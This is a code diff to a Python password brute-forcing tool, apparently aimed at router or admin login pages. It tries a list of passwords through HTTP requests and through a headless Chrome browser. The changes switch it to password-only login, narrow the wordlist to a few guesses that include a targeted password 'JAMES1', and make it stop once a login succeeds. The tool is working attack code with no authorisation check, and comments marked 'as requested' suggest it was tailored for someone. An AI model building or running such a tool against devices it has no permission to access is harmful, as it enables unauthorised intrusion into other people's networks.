@@ -355,7 +355,7 @@ class SmartDetectionTester:
             print(f"❌ Management page analysis error: {e}")
             return False, f"Analysis error: {e}"
 
-    def test_with_chrome(self, target: str, password: str, username: str = "admin") -> TestResult:
+    def test_with_chrome(self, target: str, password: str) -> TestResult:
         """Enhanced Chrome-based password testing"""
         if not self.driver:
             return TestResult(
@@ -375,7 +375,7 @@ class SmartDetectionTester:
         try:
             print(f"\n🎯 Testing Target: {target}")
             print(f"🔑 Password: {password}")
-            print(f"👤 Username: {username}")
+            print("👤 Username: (password-only login)")
             
             # Prepare URL
             if not target.startswith(('http://', 'https://')):
@@ -415,16 +415,15 @@ class SmartDetectionTester:
             
             print("🔍 Login elements found, attempting login...")
             
-            # Fill username if field exists
+            # Skip username field - only test password as requested
             if username_field:
-                username_field.clear()
-                username_field.send_keys(username)
-                verification_steps.append(f"Username entered: {username}")
+                print("⚠️ Username field found but skipping (password-only mode)")
+                verification_steps.append("Username field skipped (password-only mode)")
             
-            # Fill password
+            # Fill password only
             password_field.clear()
             password_field.send_keys(password)
-            verification_steps.append("Password entered")
+            verification_steps.append("Password entered (password-only mode)")
             
             # Submit form
             if login_button:
@@ -505,23 +504,16 @@ class SmartBruteForcer:
         self.start_time = None
         self.found_passwords = set()
         
-        # Enhanced password list with common router/admin passwords
+        # Specific password list as requested
         self.password_list = [
-            "admin", "password", "123456", "12345", "1234",
-            "user", "guest", "root", "administrator", "admin123",
-            "password123", "123456789", "qwerty", "abc123",
-            "letmein", "welcome", "monkey", "dragon", "master",
-            "JAMES1", "james1", "James1",  # Your specific password
-            "", "default", "public", "private", "secret",
-            "router", "modem", "wifi", "internet", "network",
-            "admin1", "admin12", "admin123", "pass", "pass123"
+            "admin", "JAMES1", "admin1", "user"
         ]
         
         print(f"🔐 Loaded {len(self.password_list)} passwords")
         print(f"🎮 Mode: {self.mode}")
         print(f"🚀 ENHANCED SMART MODE ACTIVATED")
     
-    async def http_test(self, target: str, password: str, username: str = "admin") -> TestResult:
+    async def http_test(self, target: str, password: str) -> TestResult:
         """Enhanced HTTP testing with better detection"""
         start_time = time.time()
         
@@ -534,11 +526,8 @@ class SmartBruteForcer:
             timeout = aiohttp.ClientTimeout(total=10)
             
             async with aiohttp.ClientSession(timeout=timeout) as session:
-                # Try multiple login data formats
+                # Only password-based login as requested
                 login_variations = [
-                    {'username': username, 'password': password},
-                    {'user': username, 'pass': password},
-                    {'login': username, 'pwd': password},
                     {'password': password},  # Password only
                     {'pass': password},
                     {'pwd': password}
@@ -586,7 +575,10 @@ class SmartBruteForcer:
                             response_time = time.time() - start_time
                             
                             if success:
-                                print(f"🎉 HTTP SUCCESS! {target} | {password}")
+                                print(f"🎉 HTTP SUCCESS! {target} | Password: {password}")
+                                print(f"   Management indicators: {management_count}")
+                                print(f"   Login indicators: {login_count}")
+                                print(f"   URL changed: {url_changed}")
                                 return TestResult(
                                     target=target,
                                     password=password,
@@ -671,55 +663,71 @@ class SmartBruteForcer:
         return targets
     
     async def brute_force_single_target(self, target: str):
-        """Enhanced single target brute force with better logic"""
+        """Enhanced single target brute force with immediate stop on success"""
         print(f"\n🎯 Testing Target: {target}")
         print("-" * 50)
         
         target_results = []
+        success_found = False
         
         # HTTP testing first (faster)
-        if self.mode in ["normal", "both"]:
+        if self.mode in ["normal", "both"] and not success_found:
             print("🔍 Starting HTTP tests...")
             for i, password in enumerate(self.password_list, 1):
                 if password in self.found_passwords:
+                    print(f"   [{i}/{len(self.password_list)}] Skipping {password} (already found)")
                     continue
                 
-                print(f"   [{i}/{len(self.password_list)}] Testing: {password}")
+                print(f"   [{i}/{len(self.password_list)}] HTTP Testing: {password}")
                 result = await self.http_test(target, password)
                 target_results.append(result)
                 
                 if result.success:
                     print(f"🎉 HTTP SUCCESS! Password: {password}")
+                    print(f"🛑 STOPPING TESTS - Password found and verified!")
                     self.found_passwords.add(password)
+                    success_found = True
                     return target_results
+                else:
+                    print(f"   ❌ HTTP Failed: {password}")
                 
                 # Small delay to avoid overwhelming the target
                 await asyncio.sleep(0.1)
         
-        # Chrome testing (more thorough)
-        if self.mode in ["chrome", "both"]:
+        # Chrome testing (more thorough) - only if HTTP didn't succeed
+        if self.mode in ["chrome", "both"] and not success_found:
             print("🔍 Starting Chrome tests...")
             chrome_tester = SmartDetectionTester(headless=True)
             
             try:
                 for i, password in enumerate(self.password_list, 1):
                     if password in self.found_passwords or any(r.success and r.password == password for r in target_results):
+                        print(f"   [{i}/{len(self.password_list)}] Skipping {password} (already tested/found)")
                         continue
                     
-                    print(f"   [{i}/{len(self.password_list)}] Chrome testing: {password}")
+                    print(f"   [{i}/{len(self.password_list)}] Chrome Testing: {password}")
                     result = chrome_tester.test_with_chrome(target, password)
                     target_results.append(result)
                     
                     if result.success:
                         print(f"🎉 CHROME SUCCESS! Password: {password}")
+                        print(f"🛑 STOPPING TESTS - Password found and management panel verified!")
                         self.found_passwords.add(password)
+                        success_found = True
                         break
+                    else:
+                        print(f"   ❌ Chrome Failed: {password}")
                     
                     # Delay between attempts
                     time.sleep(1)
                     
             finally:
                 chrome_tester.close_chrome()
+        
+        if success_found:
+            print(f"✅ Target {target} completed successfully!")
+        else:
+            print(f"❌ No valid password found for {target}")
         
         return target_results
     
